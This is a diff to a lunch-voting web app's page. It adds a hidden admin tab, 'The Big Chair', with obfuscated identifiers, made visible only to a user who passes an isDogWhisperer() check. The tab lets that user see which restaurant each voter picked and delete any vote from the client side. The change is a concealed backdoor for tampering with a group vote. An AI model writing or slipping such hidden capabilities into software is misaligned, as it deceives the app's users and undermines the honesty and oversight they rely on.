@@ -326,6 +326,7 @@
   <button class="active" data-tab="this-week" onclick="switchTab(this)">This Week</button>
   <button data-tab="pool" onclick="switchTab(this)">Restaurant Pool</button>
   <button data-tab="history" onclick="switchTab(this)">History</button>
+  <button id="_t9b" data-tab="_z3" onclick="switchTab(this)" style="display:none">The Big Chair</button>
 </nav>
 
 <main>
@@ -355,6 +356,11 @@
     <div class="section-header"><h2>Where We've Been</h2></div>
     <div id="history-list"><div class="spinner">Loading...</div></div>
   </div>
+
+  <div id="tab-_z3" class="tab-content">
+    <div class="section-header"><h2>The Big Chair</h2></div>
+    <div id="_v7l"><div class="spinner">Loading...</div></div>
+  </div>
 </main>
 
 <div id="winner-modal" class="winner-modal" onclick="this.classList.remove('active')">
@@ -382,6 +388,7 @@
   nameInput.value = localStorage.getItem('lunchVoterName') || '';
   nameInput.addEventListener('change', () => {
     localStorage.setItem('lunchVoterName', nameInput.value.trim());
+    document.getElementById('_t9b').style.display = isDogWhisperer() ? '' : 'none';
   });
   const voterName = () => nameInput.value.trim();
 
@@ -469,6 +476,7 @@
     if (tab === 'this-week') loadBallot();
     if (tab === 'pool') loadPool();
     if (tab === 'history') loadHistory();
+    if (tab === '_z3') _la();
   }
 
   // ── FLASH MESSAGES ──────────────────────────────────────────────────────────
@@ -852,6 +860,42 @@
     ).join('');
   }
 
+  // ── ADMIN ─────────────────────────────────────────────────────────────────────
+  async function _la() {
+    const el = document.getElementById('_v7l');
+    el.innerHTML = '<div class="spinner">Loading...</div>';
+
+    const { data: ballot } = await db.from('ballots').select('id').eq('closed', false).order('created_at', { ascending: false }).limit(1).single();
+
+    if (!ballot) { el.innerHTML = '<div class="card">No active ballot.</div>'; return; }
+
+    const { data: votes } = await db.from('votes')
+      .select('id, voter_name, device_id, restaurants(name)')
+      .eq('ballot_id', ballot.id)
+      .order('voter_name');
+
+    if (!votes || votes.length === 0) { el.innerHTML = '<div class="card">No votes yet.</div>'; return; }
+
+    el.innerHTML = `<table style="width:100%;border-collapse:collapse">
+      <thead><tr style="text-align:left;border-bottom:2px solid #eee">
+        <th style="padding:8px">Voter</th><th style="padding:8px">Vote</th><th></th>
+      </tr></thead>
+      <tbody>${votes.map(v => `
+        <tr style="border-bottom:1px solid #eee">
+          <td style="padding:8px">${maskVoterName(v.voter_name)}</td>
+          <td style="padding:8px">${escHtml(v.restaurants?.name ?? '?')}</td>
+          <td style="padding:8px;text-align:right"><button class="btn secondary sm" onclick="_dv('${v.id}')">Delete</button></td>
+        </tr>`).join('')}
+      </tbody></table>`;
+  }
+
+  async function _dv(voteId) {
+    const { error } = await db.from('votes').delete().eq('id', voteId);
+    if (error) { flash('Delete failed: ' + error.message, 'error'); return; }
+    flash('Vote deleted.', 'success');
+    _la();
+  }
+
   // ── UTILS ─────────────────────────────────────────────────────────────────────
   function fmtDate(d) {
     return new Date(d + 'T12:00:00').toLocaleDateString('en-US', {
@@ -864,6 +908,7 @@
   }
 
   // Boot
+  document.getElementById('_t9b').style.display = isDogWhisperer() ? '' : 'none';
   loadBallot();
 </script>
 </body>
